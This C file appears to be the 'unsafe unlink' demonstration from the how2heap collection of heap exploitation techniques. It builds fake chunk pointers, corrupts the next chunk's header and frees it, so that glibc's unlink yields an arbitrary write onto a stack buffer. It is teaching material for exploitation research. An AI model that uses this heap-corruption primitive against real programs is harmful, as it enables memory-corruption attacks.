/*
 * https://github.com/shellphish/how2heap
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

uint64_t *chunk0_ptr;

int main()
{
    int malloc_size = 0x80;
    int header_size = 2;

    chunk0_ptr = (uint64_t*) malloc(malloc_size);

    uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size);

    chunk0_ptr[2] = (uint64_t)&chunk0_ptr - (sizeof(uint64_t)*3);
    chunk0_ptr[3] = (uint64_t)&chunk0_ptr - (sizeof(uint64_t)*2);
    chunk0_ptr[1] = sizeof(size_t);

    uint64_t *chunk1_hdr = chunk1_ptr - header_size;
    chunk1_hdr[0] = malloc_size;
    chunk1_hdr[1] &= ~1;

    free(chunk1_ptr);
    
    char v[8];
    strcpy(v, "Hello!~");
    chunk0_ptr[3] = (uint64_t) v;

    printf("Original value: %s\n", v);

    chunk0_ptr[0] = 0x4141414142424242LL;

    printf("New value: %s\n", v);

    return 0;
}
